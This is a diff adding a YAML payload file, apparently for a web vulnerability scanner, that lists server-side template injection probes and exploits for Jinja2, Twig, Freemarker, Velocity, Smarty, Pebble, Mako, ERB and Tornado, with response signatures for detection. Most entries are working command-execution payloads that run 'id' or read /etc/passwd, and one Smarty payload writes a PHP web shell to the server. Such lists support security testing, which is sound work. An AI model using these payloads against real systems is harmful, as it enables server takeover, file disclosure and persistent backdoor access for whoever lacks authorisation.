@@ -1,0 +1,79 @@
+name: Server-Side Template Injection (SSTI)
+type: ssti
+description: "SSTI test payloads for Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble, Mako, Tornado"
+detection: "math expressions — check if 49 or 7777777 appears in response"
+signatures:
+  - "49"
+  - "7777777"
+  - "root:"
+  - "[''.__class__"
+  - "TemplateError"
+  - "jinja2.exceptions"
+  - "FreeMarker template error"
+  - "smarty_template_class"
+  - "TwigException"
+  - "class java.lang"
+payloads:
+  # --- Базовые math probe (универсальные) ---
+  - "{{7*7}}"
+  - "${7*7}"
+  - "#{7*7}"
+  - "<%= 7*7 %>"
+  - "{{7*'7'}}"
+  - "{7*7}"
+  - "@{7*7}"
+  - "${7*7}}"
+
+  # --- Jinja2 (Python) ---
+  - "{{config}}"
+  - "{{config.items()}}"
+  - "{{''.__class__.__mro__[1].__subclasses__()}}"
+  - "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+  - "{{''.join(['__im','port__'])}}"
+  - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+  - "{{lipsum.__globals__['os'].popen('id').read()}}"
+  - "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+  - "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+  - "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}{% endif %}{% endfor %}"
+
+  # --- Twig (PHP) ---
+  - "{{7*7}}"
+  - "{{dump(app)}}"
+  - "{{app.request.server.all|join(',')}}"
+  - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  - "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}"
+  - "{{'id'|filter('system')}}"
+  - "{{[0]|reduce('system','id')}}"
+
+  # --- Freemarker (Java) ---
+  - "${7*7}"
+  - "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}"
+  - "[#assign ex = 'freemarker.template.utility.Execute'?new()][#output_format 'plainText']{ex('id')}[/#output_format]"
+  - "${product.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(product.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"
+
+  # --- Velocity (Java) ---
+  - "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+  - "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))\n$ex.waitFor()\n#foreach($i in [1..$ex.getInputStream().available()])$str.valueOf($chr.toChars($ex.getInputStream().read()))#end"
+
+  # --- Smarty (PHP) ---
+  - "{php}echo `id`;{/php}"
+  - "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[\"cmd\"]);?>',self::clearConfig())}"
+  - "{'id'|shell_exec}"
+
+  # --- Pebble (Java) ---
+  - "{{7*7}}"
+  - "{%%} {% for i in range(3) %} {{i}} {% endfor %}"
+  - "{% set cmd = 'id' %}{{['cmd','/c',cmd]|join(' ')|shell}}"
+
+  # --- Mako (Python) ---
+  - "${7*7}"
+  - "<%\nimport os\nfoo = os.popen('id').read()\n%>${foo}"
+
+  # --- ERB (Ruby) ---
+  - "<%= 7 * 7 %>"
+  - "<%= `id` %>"
+  - "<%= system('id') %>"
+
+  # --- Tornado (Python) ---
+  - "{%import os%}{{os.system('id')}}"
+  - "{% import os %}{{ os.popen('id').read() }}"
